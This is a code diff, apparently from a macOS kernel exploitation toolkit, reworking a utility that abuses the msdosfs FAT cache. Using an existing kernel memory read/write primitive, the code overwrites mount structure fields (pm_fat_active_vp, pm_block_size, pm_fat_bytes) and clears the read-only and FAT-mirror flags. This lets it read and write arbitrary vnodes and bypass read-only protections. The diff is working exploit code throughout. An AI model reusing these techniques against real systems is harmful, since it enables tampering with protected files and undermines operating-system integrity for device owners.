@@ -8,6 +8,7 @@
 #include <limits.h>
 
 #include <sys/fcntl.h>
+#include <sys/mount.h>
 
 #include "util/vnode.h"
 #include "util/pipe.h"
@@ -70,25 +71,46 @@ struct xe_util_vnode {
 };
 
 
-xe_util_vnode_t xe_util_vnode_create(void) {
-    xe_util_msdosfs_t msdosfs_util;
-    int error = xe_util_msdosfs_mount(XE_KMEM_FAST_DEFAULT_IMAGE, "mount", &msdosfs_util);
-    xe_assert_err(error);
+xe_util_msdosfs_t xe_util_vnode_init_vol(void) {
+    xe_util_msdosfs_t vol = xe_util_msdosfs_mount(64, MNT_DONTBROWSE | MNT_DEFWRITE | MNT_ASYNC);
     
-    char mount_point[PATH_MAX];
-    xe_util_msdosfs_get_mountpoint(msdosfs_util, mount_point, sizeof(mount_point));
+    char mount[sizeof(XE_MOUNT_TEMP_DIR)];
+    xe_util_msdosfs_mount_point(vol, mount);
+    
+    char cctl_file[PATH_MAX];
+    snprintf(cctl_file, sizeof(cctl_file), "%s/cctl", mount);
+    
+    int fd = open(cctl_file, O_CREAT | O_RDWR, S_IRWXU);
+    xe_assert_errno(fd < 0);
+    
+    /// Increase file size so that start cluster of cctl file will not be `MSDOSFSROOT`
+    int res = ftruncate(fd, 1024);
+    xe_assert_errno(res);
+    
+    close(fd);
+    xe_util_msdosfs_update(vol, MNT_DONTBROWSE | MNT_RDONLY);
+    
+    return vol;
+}
+
+
+xe_util_vnode_t xe_util_vnode_create(void) {
+    xe_util_msdosfs_t msdosfs_util = xe_util_vnode_init_vol();
+    
+    char mount_point[sizeof(XE_MOUNT_TEMP_DIR)];
+    xe_util_msdosfs_mount_point(msdosfs_util, mount_point);
     
     uintptr_t proc = xe_xnu_proc_current_proc();
     
-    int mount_fd = xe_util_msdosfs_get_mount_fd(msdosfs_util);
+    int mount_fd = xe_util_msdosfs_mount_fd(msdosfs_util);
     uintptr_t mount_vnode;
-    error = xe_xnu_proc_find_fd_data(proc, mount_fd, &mount_vnode);
+    int error = xe_xnu_proc_find_fd_data(proc, mount_fd, &mount_vnode);
     xe_assert_err(error);
     uintptr_t mount = xe_kmem_read_ptr(mount_vnode, TYPE_VNODE_MEM_VN_UN_OFFSET);
     uintptr_t msdosfs_mount = xe_kmem_read_ptr(mount, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
     
     char buffer[PATH_MAX];
-    snprintf(buffer, sizeof(buffer), "%s/data1", mount_point);
+    snprintf(buffer, sizeof(buffer), "%s/cctl", mount_point);
     
     /// The file inside msdosfs mount that we will use to populate / flush FAT cache
     int cctl_fd = open(buffer, O_RDONLY);
@@ -131,22 +153,11 @@ void xe_util_vnode_flush_cache(xe_util_vnode_t util) {
 
 void xe_util_vnode_populate_cache(xe_util_vnode_t util) {
     /// Trigger `msdosfs_fat_map`
-    int res = 0;
-    int tries = 0;
-    do {
-        struct log2phys args;
-        bzero(&args, sizeof(args));
-        /// `msdosfs_fat_map` will not read FAT block from `pm_fat_active_vp` if the FAT
-        /// block is already cached. So we have to keep changing below params to
-        /// continuously populate FAT block from `pm_fat_active_vp` to `pm_fat_cache`
-        ///
-        /// TODO: Instead of random, use alternating params??
-        args.l2p_contigbytes = 16384 + random();
-        args.l2p_devoffset = 16384 + random();
-        res = fcntl(util->cctl_fd, F_LOG2PHYS_EXT, &args);
-        tries++;
-        /// If cache was populated from vnode, we will get EIO or E2BIG errno
-    } while (res == 0 && tries < 5);
+    struct log2phys args;
+    bzero(&args, sizeof(args));
+    args.l2p_contigbytes = 16384;
+    args.l2p_devoffset = 16384;
+    int res = fcntl(util->cctl_fd, F_LOG2PHYS_EXT, &args);
     xe_assert_cond(res, ==, -1);
     xe_assert(errno == EIO || errno == E2BIG);
 }
@@ -160,6 +171,7 @@ void xe_util_vnode_read_kernel(xe_util_vnode_t util, uintptr_t vnode, uintptr_t 
     int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
     uint* pm_fatmult = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FATMULT);
     uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
+    uint32_t* pm_fat_bytes = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
     uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
     
     /// Location in kernel memory for storing data read from vnode
@@ -168,6 +180,7 @@ void xe_util_vnode_read_kernel(xe_util_vnode_t util, uintptr_t vnode, uintptr_t 
     *pm_fat_cache_offset = INT32_MAX;
     /// Amount of data to be read from vnode
     *pm_block_size = (uint32_t)size;
+    *pm_fat_bytes = (uint32_t)size;
     /// This will make the offset used in `uio_create` to 0, which will allow us to read from the
     /// beginning of vnode
     *pm_fatmult = 0;
@@ -204,6 +217,7 @@ void xe_util_vnode_write_kernel(xe_util_vnode_t util, uintptr_t vnode, uintptr_t
     uint* pm_flags = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FLAGS_OFFSET);
     int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
     uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
+    uint32_t* pm_fat_bytes = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
     uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
     uint64_t* pm_sync_timer = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_TIMER);
     
@@ -213,10 +227,11 @@ void xe_util_vnode_write_kernel(xe_util_vnode_t util, uintptr_t vnode, uintptr_t
     *pm_fat_cache_offset = 0;
     /// Write data size
     *pm_block_size = (uint32_t)size;
+    *pm_fat_bytes = (uint32_t)size;
     /// Destination vnode
     *pm_fat_active_vp = vnode;
     /// Disable read only flags, if mounted with read only
-    *pm_flags &= (~MSDOSFSMNT_RONLY);
+    *pm_flags &= (~(MSDOSFSMNT_RONLY | MSDOSFS_FATMIRROR));
     /// mark FAT cache dirty
     *pm_fat_flags = 1;
     /// Required to bypass check in `msdosfs_meta_flush`, so that method
